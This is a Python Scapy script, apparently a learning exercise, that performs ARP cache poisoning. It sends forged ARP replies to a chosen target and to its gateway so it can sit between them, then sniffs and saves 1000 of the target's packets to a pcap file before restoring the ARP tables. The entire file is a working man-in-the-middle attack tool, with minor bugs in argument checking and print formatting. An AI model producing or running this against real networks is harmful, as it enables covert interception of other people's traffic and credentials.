#!/usr/bin/python3
# make use of python3, whereby debi(li)an has still python2 as defautl

from scapy.all import *     #special lib for networking
import os                   # os utils for python
import sys                  # os stuff -> argument vector
import threading            # threading makes this script go faster

# argument vector
interface    = sys.argv[1] 
gateway_ip   = sys.argv[2]
target_ip    = sys.argv[3]

packet_count = 1000
poisoning    = True

# helper function for correct usage
def usage():
    if len(sys.argv) < 4:
        print("Not sufficient arguments try")
        print("./arper devie_interface gateway_ip target_ip")
        print("example:")
        print("./arper eth0 10.0.1.1 10.0.1.2")
        sys.exit(1)

# function to restore original/initial state
# undoes the poisoning
def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    # slightly different method using send
    print ("[*] Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)

# return mac address of ethernet device via ARP lookup
def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    # return the MAC address from a response
    for s,r in responses:
        return r[Ether].src
    return None

# poisoning function 
# 
def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    global poisoning

    poison_target = ARP()
    poison_target.op   = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst= target_mac

    poison_gateway = ARP()
    poison_gateway.op   = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst= gateway_mac

    print( "[*] Beginning the ARP poison. [CTRL-C/STR-C to stop]")

    while poisoning:
        send(poison_target)
        send(poison_gateway)

        time.sleep(2)

    print ("[*] ARP poison attack finished.")

    return

#---------------------------------------------------------------------
# SCRIPTS STARTS HERE 
#---------------------------------------------------------------------
usage()
# set our interface
conf.iface = interface

# turn off output
conf.verb  = 0

print ("[*] Setting up ", interface)

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print ("[!!!] Failed to get gateway MAC. Exiting.")
    sys.exit(0)
else:
    print ("[*] Gateway %s is at ", (gateway_ip,gateway_mac))

target_mac = get_mac(target_ip)

if target_mac is None:
    print ("[!!!] Failed to get target MAC. Exiting.")
    sys.exit(0)
else:
    print( "[*] Target %s is at", (target_ip,target_mac))

# start poison thread
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac,target_ip,target_mac))
poison_thread.start()

try:
    print ("[*] Starting sniffer for %d packets", packet_count)

    bpf_filter  = "ip host %s" % target_ip
    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)

except KeyboardInterrupt:
    pass

finally:
    # write out the captured packets
    print ("[*] Writing packets to arper.pcap")
    wrpcap('arper.pcap',packets)

    poisoning = False

    # wait for poisoning thread to exit
    time.sleep(2)

    # restore the network
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    sys.exit(0)